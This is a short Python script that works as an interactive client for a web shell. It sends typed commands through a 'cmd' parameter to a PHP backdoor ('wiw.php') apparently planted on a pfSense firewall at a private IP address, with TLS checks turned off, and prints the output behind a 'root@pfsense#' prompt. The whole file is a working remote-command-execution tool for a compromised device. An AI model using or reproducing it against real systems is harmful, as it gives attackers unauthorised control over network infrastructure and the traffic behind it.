#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Yanis Alim

import requests
import os

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import readline
readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode nano')


URL = "https://172.16.0.1/"
BACKDOOR = "wiw.php"
PARAMS = { "cmd" : "" }

while True :
   
    try :
        cmd = input("root@pfsense# ").strip(" \t\n")
    except Exception :
        print()
        exit(1)
    else :
        PARAMS["cmd"] =  cmd
        if cmd == "clear" :
            os.system("clear")
        r = requests.get(URL + BACKDOOR, params=PARAMS, verify=False)
        print(r.text[5:-6] if len(r.text) > 10 else "" )